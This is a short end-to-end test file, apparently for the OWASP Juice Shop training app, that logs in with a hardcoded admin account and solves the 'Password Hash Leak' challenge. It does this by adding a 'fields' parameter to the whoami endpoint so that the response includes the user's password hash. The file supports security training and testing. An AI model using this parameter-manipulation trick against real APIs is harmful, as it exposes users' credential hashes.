import { describe, it, beforeEach, expect } from '@jest/globals'

describe('challenge "Password Hash Leak"', () => {
  beforeEach(() => {
    cy.login({ email: 'admin@juice-sh.op', password: 'admin123' })
  })

  it('should solve the challenge by leaking the password hash via fields parameter', () => {
    cy.request({
      method: 'GET',
      url: '/rest/user/whoami?fields=id,email,password',
      headers: {
        // Cypress automatically handles cookies after cy.login
      }
    }).then((res) => {
      expect(res.body.user.password).toEqual(expect.any(String))
      expect(res.body.user.password.length).toBeGreaterThan(0)
      cy.expectChallengeSolved({ challenge: 'Password Hash Leak' })
    })
  })
})
